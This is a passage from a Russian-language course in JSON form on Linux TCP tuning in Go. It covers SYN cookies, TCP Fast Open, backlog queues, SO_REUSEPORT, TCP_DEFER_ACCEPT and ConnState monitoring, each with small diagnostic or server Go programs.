        "bigtech_interview": "В высоконагруженных прокси Nginx и Envoy директива `reuseport` позволяет линейно масштабировать пропускную способность по числу физических ядер процессора."
    },
    {
        "num": 23,
        "title": "Защита сетевого стека от SYN-флуда через SYN Cookies",
        "task": "Изучите механизм работы TCP SYN Cookies в ядре Linux (sysctl net.ipv4.tcp_syncookies), объясните криптографическое кодирование состояния сокета в ISN и напишите Go-скрипт инспекции сетевых параметров.",
        "theory": "SYN Flood — DoS-атака, при которой злоумышленник отправляет миллионы SYN-пакетов с поддельных IP-адресов. Сервер отправляет SYN-ACK и выделяет в ядре блок памяти `struct request_sock` в очереди полуоткрытых соединений. Очередь переполняется за секунды. Механизм SYN Cookies решает проблему: при переполнении очереди ядро ПРЕКРАЩАЕТ выделять память под сокет, а шифрует параметры соединения (MSS, временную метку) прямо в 32-битный начальный порядковый номер ISN (Initial Sequence Number). Память выделяется только тогда, когда клиент пришлет реальный финальный пакет ACK.",
        "step_by_step": [
            "Проверьте значение параметра ядра: `sysctl net.ipv4.tcp_syncookies`.",
            "Изучите структуру генерации криптографического хеша для поля Sequence Number.",
            "Реализуйте Go-утилиту, считывающую сетевые счетчики из `/proc/net/snmp` и `/proc/net/netstat`.",
            "Проверьте счетчик `SyncookiesSent` и `SyncookiesRecv`."
        ],
        "code_blocks": [
            {
                "filename": "syncookie_inspector.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc CheckSyncookies() {\n\tdata, err := os.ReadFile(\"/proc/sys/net/ipv4/tcp_syncookies\")\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Не удалось прочитать tcp_syncookies: %v\\n\", err)\n\t\treturn\n\t}\n\tval := strings.TrimSpace(string(data))\n\tif val == \"1\" {\n\t\tfmt.Println(\"[SYSCTL] net.ipv4.tcp_syncookies = 1 (АКТИВНО: Защита от SYN Flood включена)\")\n\t} else {\n\t\tfmt.Printf(\"[SYSCTL] net.ipv4.tcp_syncookies = %s (ВНИМАНИЕ: Защита отключена!)\\n\", val)\n\t}\n}\n\nfunc main() {\n\tCheckSyncookies()\n\t_ = bufio.ScanLines\n}\n",
                "note": "Инспекция статуса защиты от SYN-флуда в подсистеме sysctl Linux"
            }
        ],
        "under_the_hood": "Go-приложение полностью изолировано от механизма SYN Cookies: сокет передается приложению через вызов `accept()` только после полной валидации третьего рукопожатия ядра.",
        "pitfalls": "При генерации SYN Cookie теряются некоторые расширенные опции TCP (например, большие TCP Window Scales), если в ядре не включены TCP Timestamps (`net.ipv4.tcp_timestamps=1`).",
        "bigtech_interview": "Почему SYN Cookies включаются по умолчанию только при переполнении очереди backlog, а не работают всегда? Потому что вычисление криптографического хеша на каждый SYN создает дополнительную нагрузку на CPU ядра."
    },
    {
        "num": 24,
        "title": "Ускорение сетевого рукопожатия через TCP Fast Open (TFO)",
        "task": "Включите поддержку TCP Fast Open на слушающем сокете Go с помощью вызова setsockopt(TCP_FASTOPEN) и объясните выигрыш 1 RTT при повторных подключениях.",
        "theory": "Стандартное TCP-рукопожатие требует 1 полный круговой цикл RTT (SYN -> SYN-ACK -> ACK) до того, как клиент сможет отправить первые полезные данные (HTTP-запрос). Механизм TCP Fast Open (RFC 7413) позволяет клиенту при повторном подключении передавать полезные данные прямо внутри первого пакета SYN, используя криптографическую куку (TFO Cookie), выданную сервером ранее. Это снижает задержку первого байта (TTFB) на 100% времени RTT.",
        "step_by_step": [
            "Проверьте поддержку TFO в ядре Linux: `sysctl net.ipv4.tcp_fastopen = 3` (1 - client, 2 - server, 3 - both).",
            "Сконфигурируйте `net.ListenConfig` с хуком `Control`.",
            "Установите опцию сокета `unix.TCP_FASTOPEN` с размером очереди TFO.",
            "Проверьте установку соединений с нулевым начальным оверхедом RTT."
        ],
        "code_blocks": [
            {
                "filename": "tfo_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc ListenWithTFO(addr string, queueLen int) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar errOp error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// 23 соответствует TCP_FASTOPEN в Linux\n\t\t\t\terrOp = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 23, queueLen)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn errOp\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), \"tcp\", addr)\n}\n\nfunc main() {\n\tln, err := ListenWithTFO(\"127.0.0.1:0\", 256)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Ошибка активации TFO: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[TFO] Сервер успешно слушает на %s с поддержкой TCP Fast Open\\n\", ln.Addr())\n}\n",
                "note": "Активация TCP Fast Open на сервере через системный вызов ядра"
            }
        ],
        "under_the_hood": "Сервер генерирует TFO Cookie шифрованием IP-адреса клиента ключом AES-128. При получении пакета SYN с валидной кукой ядро немедленно передает данные из SYN в буфер сокета еще до завершения полного трехстороннего рукопожатия.",
        "pitfalls": "TFO может приводить к атакам повтора (Replay Attacks) для неидемпотентных POST-запросов, если сетевой пакет SYN был продублирован промежуточными маршрутизаторами сети.",
        "bigtech_interview": "Почему TFO безопасен для идемпотентных запросов (GET/HEAD), но требует аккуратности с финансовыми транзакциями? Из-за отсутствия защиты от повторной отправки пакета SYN на транспортном уровне."
    },
    {
        "num": 25,
        "title": "Тюнинг очередей сокетов ядра (somaxconn, tcp_max_syn_backlog)",
        "task": "Исследуйте влияние параметров ядра somaxconn и tcp_max_syn_backlog на глубину очереди входящих соединений и научитесь диагностировать переполнение очередей через команду ss -lnt.",
        "theory": "При приеме сетевых пакетов ядро Linux использует две очереди:\n1. SYN Backlog (длина `net.ipv4.tcp_max_syn_backlog`): очередь полуоткрытых соединений, ожидающих финального ACK от клиента.\n2. Accept Queue (длина `net.core.somaxconn`): очередь полностью установленных соединений, ожидающих вызова `Accept()` со стороны Go рантайма.\nВ Go вызов `listen(fd, backlog)` использует аргумент, ограниченный сверху параметром `somaxconn`. Если приложение не успевает вызывать `Accept()`, очередь переполняется, и ядро отбрасывает пакеты.",
        "step_by_step": [
            "Проверьте текущие лимиты ядра: `sysctl net.core.somaxconn`.",
            "Выполните команду `ss -lnt` и проанализируйте колонки `Send-Q` (максимальный размер очереди) и `Recv-Q` (текущее число ожидающих соединений).",
            "Настройте безопасные значения: `sysctl -w net.core.somaxconn=4096` и `net.ipv4.tcp_max_syn_backlog=8192`.",
            "Реализуйте Go-утилиту, считывающую счетчики дропов пакетов из `/proc/net/netstat`."
        ],
        "code_blocks": [
            {
                "filename": "backlog_audit.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc AuditBacklogSettings() {\n\tkeys := []string{\n\t\t\"/proc/sys/net/core/somaxconn\",\n\t\t\"/proc/sys/net/ipv4/tcp_max_syn_backlog\",\n\t}\n\tfor _, k := range keys {\n\t\tdata, err := os.ReadFile(k)\n\t\tif err == nil {\n\t\t\tfmt.Printf(\"[SYSCTL] %s = %s\", k, string(data))\n\t\t} else {\n\t\t\tfmt.Printf(\"[WARN] Не удалось прочитать %s: %v\\n\", k, err)\n\t\t}\n\t}\n}\n\nfunc main() {\n\tAuditBacklogSettings()\n\t_ = strings.Clone\n}\n",
                "note": "Чтение системных лимитов очередей сетевых сокетов ядра"
            }
        ],
        "under_the_hood": "Если колонка `Recv-Q` в выводе `ss -lnt` больше нуля, это означает, что горутины сервера Go не успевают вычитывать готовые соединения, и в системе нарастает очередь задержек.",
        "pitfalls": "Увеличение `somaxconn` в Go-приложении не даст эффекта, если в конфигурации операционной системы `sysctl` параметр `net.core.somaxconn` остался равным дефолтным 128.",
        "bigtech_interview": "Что означает ненулевой счетчик ListenOverflows в выводе netstat -s? Это индикатор того, что ядро Linux сбросило входящие TCP-соединения из-за переполнения Accept Queue Go-сервера."
    },
    {
        "num": 26,
        "title": "Практическое развертывание кластера процессов с SO_REUSEPORT",
        "task": "Напишите законченную Go-программу, которая при запуске нескольких независимых экземпляров успешно садится на единый локальный порт 8080 и логирует PID процесса, обработавшего каждый входящий запрос.",
        "theory": "SO_REUSEPORT позволяет реализовать простейшую и высокоэффективную балансировку нагрузки уровня ядра без необходимости развертывания Nginx на той же ноде. Запустив по одному экземпляру Go-бинарника на каждое физическое ядро процессора, мы получаем параллельные независимые GMP-рантаймы с изолированными сборщиками мусора (GC), что устраняет глобальные блокировки кучи (heap lock contention).",
        "step_by_step": [
            "Напишите сервер с установкой флага `SO_REUSEPORT`.",
            "В теле HTTP-обработчика возвращайте PID текущего процесса: `os.Getpid()`.",
            "Скомпилируйте бинарник и запустите 2-3 процесса в разных терминалах на одном порту.",
            "Отправьте серию запросов через `curl` и убедитесь, что разные запросы обслуживаются разными PID."
        ],
        "code_blocks": [
            {
                "filename": "cluster_reuseport.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"os\"\n\t\"syscall\"\n)\n\nfunc main() {\n\tpid := os.Getpid()\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\treturn c.Control(func(fd uintptr) {\n\t\t\t\t_ = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t})\n\t\t},\n\t}\n\n\tln, err := lc.Listen(context.Background(), \"tcp\", \"127.0.0.1:8080\")\n\tif err != nil {\n\t\tfmt.Printf(\"[PID %d] Ошибка привязки сокета: %v\\n\", pid, err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Ответ обработан процессом PID: %d\\n\", pid)\n\t})\n\n\tfmt.Printf(\"[PID %d] Воркер успешно слушает на 127.0.0.1:8080 (SO_REUSEPORT)\\n\", pid)\n\t_ = http.Serve(ln, mux)\n}\n",
                "note": "Сервер с шардированием порта и идентификацией обслуживающего процесса"
            }
        ],
        "under_the_hood": "Хэширование сокетов в ядре Linux детерминировано для каждого 4-кортежа соединений, обеспечивая привязку повторных сессий клиента к одному и тому же процессу.",
        "pitfalls": "При перезапуске одного из воркеров во время выкатки релиза возможен кратковременный сброс соединений, если не настроен eBPF reuseport_select_sk.",
        "bigtech_interview": "Как SO_REUSEPORT помогает реализовать Zero-Downtime перезапуск бинарников? Новый процесс поднимается на том же порту, начинает принимать часть трафика, после чего старому процессу отправляется сигнал SIGTERM на graceful shutdown."
    },
    {
        "num": 27,
        "title": "Оптимизация пробуждения горутин через TCP_DEFER_ACCEPT",
        "task": "Сконфигурируйте системную опцию TCP_DEFER_ACCEPT в ListenConfig.Control и объясните, как она защищает сервер от пустых SYN-ACK флудов, откладывая пробуждение Go до прихода первого байта данных.",
        "theory": "Обычный сокет переходит в состояние готовности к `Accept()` сразу после завершения 3-стороннего рукопожатия TCP (при получении ACK), даже если клиент еще не прислал ни одного байта данных. Если миллион ботов открыли соединения и молчат, рантайм Go проснется, выделит горутины и заблокируется в ожидании. Опция `TCP_DEFER_ACCEPT` приказывает ядру Linux удерживать соединение в очереди ядра и НЕ передавать его в Go до тех пор, пока клиент физически не пришлет первый пакет с полезной нагрузкой.",
        "step_by_step": [
            "Инициализируйте `net.ListenConfig` с хуком `Control`.",
            "Установите опцию: `syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, syscall.TCP_DEFER_ACCEPT, 10)` (ждать данные до 10 секунд).",
            "Проверьте, что пустое соединение (без отправки данных) не пробуждает вызов `Accept()` в Go.",
            "Убедитесь, что передача полезной нагрузки немедленно инициирует обработку."
        ],
        "code_blocks": [
            {
                "filename": "defer_accept_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc ListenWithDeferAccept(addr string, timeoutSec int) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar opErr error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// Опция TCP_DEFER_ACCEPT (константа 9 в Linux x86_64)\n\t\t\t\topErr = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 9, timeoutSec)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn opErr\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), \"tcp\", addr)\n}\n\nfunc main() {\n\tln, err := ListenWithDeferAccept(\"127.0.0.1:0\", 5)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Ошибка TCP_DEFER_ACCEPT: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[DEFER-ACCEPT] Сервер слушает на %s: Go спит до появления первых данных!\\n\", ln.Addr())\n}\n",
                "note": "Установка TCP_DEFER_ACCEPT для защиты от пробуждения на пустых соединениях"
            }
        ],
        "under_the_hood": "Если за время `timeoutSec` клиент так и не прислал данные, ядро Linux самостоятельно сбрасывает TCP-сессию без единого переключения контекста в пространство пользователя.",
        "pitfalls": "При использовании протоколов, где первым говорит сервер (например, SSH или FTP banner), использование `TCP_DEFER_ACCEPT` приведет к взаимной блокировке (deadlock), так как сервер ждет данных от клиента, а клиент ждет баннера сервера.",
        "bigtech_interview": "В чем главное достоинство TCP_DEFER_ACCEPT для веб-серверов HTTP? Оно делает DoS-атаку пустыми TCP-соединениями абсолютно бесплатной для приложения, перекладывая отсев на плечи сетевого стека ядра."
    },
    {
        "num": 28,
        "title": "Мониторинг жизненного цикла соединений через хук http.Server.ConnState",
        "task": "Настройте поле ConnState в http.Server для отслеживания переходов состояний (StateNew, StateActive, StateIdle, StateClosed) и реализуйте экспорт метрики активных сокетов с защитой от паник.",
        "theory": "Поле `ConnState` в структуре `http.Server` предоставляет синхронный колбэк при изменении состояния каждого TCP-соединения. Состояния:\n* `StateNew`: сокет принят из `Accept()`, начинается чтение заголовков.\n* `StateActive`: обрабатывается запрос (горутина-обработчик активна).\n* `StateIdle`: соединение простаивает в пуле Keep-Alive.\n* `StateHijacked` / `StateClosed`: сокет перехвачен или закрыт.\nЭтот механизм позволяет отслеживать точное число 'зависших' соединений в реальном времени и вовремя реагировать на аномалии.",
        "step_by_step": [
            "Определите функцию-обработчик `ConnState func(net.Conn, http.ConnState)`.",
            "Используйте `sync/atomic` для ведения счетчиков состояний.",
            "Защитите колбэк от паник через `recover()`.",
            "Экспортируйте полученные значения в Prometheus или логируйте при превышении порогов."
        ],
        "code_blocks": [
            {
                "filename": "conn_state_monitor.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"sync/atomic\"\n)\n\ntype ConnectionStats struct {\n\tNew    int64\n\tActive int64\n\tIdle   int64\n\tClosed int64\n}\n\nfunc main() {\n\tvar stats ConnectionStats\n\n\tsrv := &http.Server{\n\t\tAddr: \":8080\",\n\t\tConnState: func(c net.Conn, state http.ConnState) {\n\t\t\tdefer func() {\n\t\t\t\tif r := recover(); r != nil {\n\t\t\t\t\tfmt.Printf(\"[RECOVER] Перехвачена паника в ConnState: %v\\n\", r)\n\t\t\t\t}\n\t\t\t}()\n\n\t\tswitch state {\n\t\tcase http.StateNew:\n\t\t\tatomic.AddInt64(&stats.New, 1)\n\t\tcase http.StateActive:\n\t\t\tatomic.AddInt64(&stats.Active, 1)\n\t\tcase http.StateIdle:\n\t\t\tatomic.AddInt64(&stats.Idle, 1)\n\t\tcase http.StateClosed:\n\t\t\tatomic.AddInt64(&stats.Closed, 1)\n\t\t}\n\t\t},\n\t}\n\n\tfmt.Println(\"[CONN-STATE] Мониторинг состояний HTTP соединений успешно инициализирован.\")\n\t_ = srv\n}\n",
                "note": "Отслеживание жизненного цикла TCP-сокетов через ConnState хук"
            }
        ],
        "under_the_hood": "Сервер Go вызывает `ConnState` синхронно из рабочей горутины соединения. Любая блокировка или тяжелая операция внутри колбэка затормозит обработку запросов всего сервиса.",
        "pitfalls": "Вызов блокирующих I/O операций или сетевых запросов внутри `ConnState` приведет к деградации производительности сервера.",
        "bigtech_interview": "Как в проде детектировать утечку горутин, застрявших на медленных сокетах? Сравнивать количество соединений в состоянии StateActive с числом запущенных горутин в рантайме (runtime.NumGoroutine)."
    }
]
